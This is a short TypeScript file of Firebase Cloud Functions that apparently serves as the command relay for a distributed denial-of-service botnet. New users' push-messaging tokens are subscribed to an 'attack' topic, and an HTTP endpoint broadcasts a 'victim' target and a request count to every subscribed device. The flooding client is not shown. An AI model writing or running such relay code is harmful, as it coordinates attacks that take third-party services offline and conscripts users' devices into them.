import * as functions from 'firebase-functions';
import * as admin from 'firebase-admin';
admin.initializeApp();
admin.firestore().settings({ timestampsInSnapshots: true });

export const signup = functions.firestore.document('/users/{userId}').onCreate((snap, context) => {
  const user = snap.data();
  return admin.messaging().subscribeToTopic(user.token, 'attack');
});

export const attack = functions.https.onRequest((req, res) => {
  const { victim, requests } = req.body;
  console.log({ victim, requests });
  return admin.messaging().sendToTopic('attack', { data: { victim, requests } }).then(() => {
    res.statusCode = 200;
    res.send('OK');
  });
});
